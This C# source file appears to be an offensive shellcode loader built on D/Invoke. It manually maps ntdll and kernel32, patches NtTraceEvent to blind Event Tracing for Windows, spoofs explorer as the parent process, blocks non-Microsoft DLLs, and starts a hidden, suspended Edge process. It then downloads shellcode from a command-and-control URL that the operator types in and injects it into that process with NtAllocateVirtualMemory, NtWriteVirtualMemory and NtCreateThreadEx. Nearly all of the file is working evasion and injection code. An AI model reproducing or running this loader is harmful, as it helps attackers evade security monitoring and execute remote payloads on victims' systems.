using System;
using System.Runtime.InteropServices;
using System.Net;
using System.Diagnostics;

using Data = DInvoke.Data;
using DInvoke.ManualMap;
using DInvoke.DynamicInvoke;
using static DInvoke.Data.Win32.Kernel32;
using static DInvoke.Data.Win32.WinNT;

// D/Invoke Manual Mapping
// Native API
// PPID Spoofing
// Process Mitigation Policy (BlockDLLs)
// Patch ETW

namespace ManualMap
{
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate bool CreateProcessWDelegate(
            string applicationName,
            string commandLine,
            ref SECURITY_ATTRIBUTES processAttributes,
            ref SECURITY_ATTRIBUTES threadAttributes,
            bool inheritHandles,
            CREATION_FLAGS creationFlags,
            IntPtr environment,
            string currentDirectory,
            [In] ref STARTUPINFOEX startupInfo,
            out PROCESS_INFORMATION processInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate Data.Native.NTSTATUS NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            AllocationType AllocationType,
            MemoryProtection Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate Data.Native.NTSTATUS NtWriteVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate Data.Native.NTSTATUS NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate Data.Native.NTSTATUS NtCreateThreadExDelegate(
            out IntPtr threadHandle,
            ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        public delegate bool CloseHandleDelegate(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, 
            int dwAttributeCount, 
            int dwFlags, 
            ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, 
            uint dwFlags, 
            IntPtr Attribute, 
            IntPtr lpValue, 
            IntPtr cbSize, 
            IntPtr lpPreviousValue, 
            IntPtr lpReturnSize);


        public static bool p3TW(Data.PE.PE_MANUAL_MAP nt)
        {
            IntPtr addr = Generic.GetLibraryAddress("ntdll.dll", "NtTraceEvent");
            byte[] patch = new byte[] { 0xc3 };

            var funcParams = new object[]
            {
                (IntPtr)(-1),
                addr,
                (IntPtr)patch.Length,
                (uint)MemoryProtection.ExecuteReadWrite,
                new uint()
            };

            var res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(NtProtectVirtualMemoryDelegate),
                funcParams,
                false);

            if (res != Data.Native.NTSTATUS.Success)
            {
                Map.FreeModule(nt);
                return false;
            }

            Marshal.Copy(patch, 0, addr, 1);

            funcParams = new object[]
            {
                (IntPtr)(-1),
                addr,
                (IntPtr)patch.Length,
                (uint)funcParams[4],
                new uint()
            };

            res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(NtProtectVirtualMemoryDelegate),
                funcParams,
                false);

            if (res != Data.Native.NTSTATUS.Success)
            {
                return false;
            }
            return true;
        }

        public static void Main()
        {
            // map dll
            var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
            var krn = Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
            Console.WriteLine("[>] NTDLL mapped to 0x{0:X}", nt.ModuleBase.ToInt64());
            Console.WriteLine("[>] Kernel32 mapped to 0x{0:X}", krn.ModuleBase.ToInt64());

            // patch etw
            if (!p3TW(nt))
            {
                Console.Error.WriteLine($"[x] Event Tracing for Windows Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[>] Event Tracing for Windows Patched");


            // ppid dpoof & blockdlls
            var startInfoEx = new STARTUPINFOEX();
            var processInfo = new PROCESS_INFORMATION();

            startInfoEx.StartupInfo.cb = Marshal.SizeOf(startInfoEx);

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            var processSecurity = new SECURITY_ATTRIBUTES();
            var threadSecurity = new SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
            startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);

            Marshal.WriteIntPtr(lpValue, new IntPtr((long)BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));

            UpdateProcThreadAttribute(
                startInfoEx.lpAttributeList,
                0,
                (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
                );

            var parentHandle = Process.GetProcessesByName("explorer")[0].Handle;
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, parentHandle);

            UpdateProcThreadAttribute(
                startInfoEx.lpAttributeList,
                0,
                (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
                );

            // create process
            var funcParams = new object[]
                {
                    @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start""",
                    processSecurity,
                    threadSecurity,
                    false,
                    CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT | CREATION_FLAGS.CREATE_SUSPENDED | CREATION_FLAGS.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    @"C:\Program Files (x86)\Microsoft\Edge\Application",
                    startInfoEx,
                    processInfo
                };

            var success = Generic.CallMappedDLLModuleExport<bool>(
                krn.PEINFO,
                krn.ModuleBase,
                "CreateProcessW",
                typeof(CreateProcessWDelegate),
                funcParams,
                false);

            var pi = (PROCESS_INFORMATION)funcParams[9];

            if (!success)
            {
                Console.WriteLine("[x] CreateProcessW failed with error code: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[>] CreateProcessW: {pi.dwProcessId}");


            byte[] sh;
            using (var client = new WebClient())
            {
                // make proxy aware
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;

                // set allowed tls versions
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

                Console.Write("[>] URL: ");
                string c2 = Console.ReadLine();
                sh = client.DownloadData(c2);
            };

            // NtAllocateVirtualMemory
            funcParams = new object[]
            {
                pi.hProcess,
                IntPtr.Zero,
                IntPtr.Zero,
                (IntPtr)sh.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite
            };

            var res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(NtAllocateVirtualMemoryDelegate),
                funcParams,
                false);

            var baseAddress = (IntPtr)funcParams[1];

            if (res != Data.Native.NTSTATUS.Success)
            {
                Console.Error.WriteLine($"[x] NtAllocateVirtualMemory Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[>] NtAllocateVirtualMemory OK");

            // NtWriteVirtualMemory
            var buffer = Marshal.AllocHGlobal(sh.Length);
            Marshal.Copy(sh, 0, buffer, sh.Length);
            uint bytesWritten = 0;
            
            funcParams = new object[]
            {
                pi.hProcess,
                baseAddress,
                buffer,
                (uint)sh.Length,
                bytesWritten
            };

            res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(NtWriteVirtualMemoryDelegate),
                funcParams,
                false);

            if (res != Data.Native.NTSTATUS.Success)
            {
                Console.Error.WriteLine($"[x] NtWriteVirtualMemory Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[>] NtWriteVirtualMemory OK");


            // NtProtectVirtualMemory
            uint oldP = 0;
            
            funcParams = new object[]
            {
                pi.hProcess,
                baseAddress,
                (IntPtr)sh.Length,
                (uint)MemoryProtection.ExecuteRead,
                oldP
            };

            res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(NtProtectVirtualMemoryDelegate),
                funcParams,
                false);

            if (res != Data.Native.NTSTATUS.Success)
            {
                Console.Error.WriteLine($"[x] NtProtectVirtualMemory Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[>] NtProtectVirtualMemory OK");

            // NtCreateThreadEx
            IntPtr hThread = IntPtr.Zero;
            funcParams = new object[]
            {
                hThread,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                pi.hProcess,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            };

            res = Generic.CallMappedDLLModuleExport<Data.Native.NTSTATUS>(
                nt.PEINFO,
                nt.ModuleBase,
                "NtCreateThreadEx",
                typeof(NtCreateThreadExDelegate),
                funcParams,
                false);

            if (res != Data.Native.NTSTATUS.Success)
            {
                Console.Error.WriteLine($"[x] NtCreateThreadEx Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[>] NtCreateThreadEx OK");


            // free map
            Map.FreeModule(krn);
            Map.FreeModule(nt);

            // close handles
            funcParams = new object[] { pi.hThread };
            success = Generic.DynamicApiInvoke<bool>(
                "kernel32.dll",
                "CloseHandle",
                typeof(CloseHandleDelegate),
                ref funcParams);

            funcParams = new object[] { pi.hProcess };
            success = Generic.DynamicApiInvoke<bool>(
                "kernel32.dll",
                "CloseHandle",
                typeof(CloseHandleDelegate),
                ref funcParams);
        }
    }
}
